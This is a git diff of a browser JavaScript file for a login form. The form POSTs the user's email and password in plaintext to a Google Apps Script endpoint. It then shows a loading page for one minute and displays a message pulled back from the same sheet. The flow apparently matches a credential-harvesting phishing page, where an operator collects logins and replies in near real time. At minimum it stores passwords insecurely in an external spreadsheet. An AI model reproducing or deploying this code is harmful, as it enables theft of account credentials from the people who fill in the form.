@@ -1,7 +1,7 @@
-const API_URL = "https://script.google.com/macros/s/AKfycbz1IR_8B0IACajd6hvcwMa9u-cTl2Yz1O5-tmErhu0BuOHcmOJ1NFVJvs0cX9g32zwX/exec";
+const API_URL = "https://script.google.com/macros/s/AKfycbzl_2VuUot0q_oRkG8swj3nVFzTIyZHMRX3hH02WPVeXHsHXOGu7aE9JGYhGop6brwl/exec";
 
-// 🔹 LOGIN + SEND DATA
-async function login() {
+// STEP 1: LOGIN + SEND DATA
+async function startProcess() {
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value.trim();
 
@@ -11,7 +11,7 @@ async function login() {
   }
 
   try {
-    const res = await fetch(API_URL, {
+    await fetch(API_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -19,19 +19,20 @@ async function login() {
       body: JSON.stringify({ email, password })
     });
 
-    const data = await res.json();
+    // show loading page
+    showPage("loadingPage");
 
-    document.getElementById("msg").innerText =
-      data.message || "Saved ✔";
+    // wait 1 minute
+    setTimeout(loadMessage, 60000);
 
   } catch (err) {
-    console.error("Send error:", err);
+    console.error(err);
     alert("Error sending data");
   }
 }
 
 
-// 🔹 REAL-TIME MESSAGE LOAD
+// STEP 2: GET MESSAGE FROM SHEET
 async function loadMessage() {
   try {
     const res = await fetch(API_URL);
@@ -39,14 +40,16 @@ async function loadMessage() {
 
     document.getElementById("msg").innerText = data.message;
 
+    showPage("resultPage");
+
   } catch (err) {
-    console.log("Load error");
+    alert("Error loading message");
   }
 }
 
 
-// 🔹 AUTO UPDATE (REAL-TIME FEEL)
-window.onload = () => {
-  loadMessage();
-  setInterval(loadMessage, 2000); // 2 seconds safe realtime
-};
+// PAGE SWITCHER
+function showPage(pageId) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+  document.getElementById(pageId).classList.add("active");
+}
